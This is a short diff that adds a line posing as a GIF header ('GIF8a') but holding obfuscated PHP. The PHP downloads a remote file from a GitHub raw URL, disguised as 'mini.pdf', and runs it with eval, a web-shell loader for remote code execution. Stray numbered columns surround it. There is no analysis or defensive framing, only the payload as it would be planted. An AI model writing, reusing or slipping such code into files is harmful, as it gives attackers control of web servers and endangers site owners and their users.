@@ -1,0 +1,2 @@
+    1	2	3	4	5	6	7	8	9
+GIF8a<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(rawurldecode(urldecode("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/mini.pdf "))));/**/?>	11	12	13	14	15	16	17	18	19	20	21	22	23	24	25	26
